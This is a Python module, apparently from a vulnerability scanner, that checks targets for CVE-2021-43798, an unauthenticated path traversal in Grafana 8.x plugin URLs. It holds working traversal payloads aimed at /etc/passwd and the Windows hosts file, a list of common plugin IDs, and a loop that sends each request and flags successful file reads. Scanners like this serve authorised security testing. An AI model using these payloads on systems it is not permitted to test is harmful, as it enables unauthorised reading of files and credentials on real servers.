#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2021_43798_payloads = [
    {'path': 'public/plugins/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'},
    {'path': 'public/plugins/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'public/plugins/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\Windows\System32\drivers\etc\hosts'},
    {'path': 'plugins/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'},
    # {'path': '{}/../../../../../../../../../../../../../etc/passwd'},
]

# * 该漏洞是由插件模块引起的, 以下是一些常见的插件id
cve_2021_43798_plugins = [
    'alertlist',
    'cloudwatch',
    'dashlist',
    'elasticsearch',
    'graph',
    'graphite',
    'heatmap',
    'influxdb',
    'mysql',
    'opentsdb',
    'pluginlist',
    'postgres',
    'prometheus',
    'stackdriver',
    'table',
    'text'
]

# def quit(signum, frame):
#     raise KeyboardInterrupt

def cve_2021_43798_scan(self, clients):
    ''' 2021年12月, 一位Twitter用户披露了一个0day漏洞, 
        未经身份验证的攻击者可以利用该漏洞通过 Grafana 8.x 的插件url来遍历web路径并下载任意文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'File-Read',
        'vul_id': 'CVE-2021-43798',
    }
    
    for payload in cve_2021_43798_payloads:
        for plugin in cve_2021_43798_plugins:
            path = payload['path'].format(PLUGIN=plugin)

            res = client.request(
                'get',
                path,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (check.check_res_fileread(res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
    return None
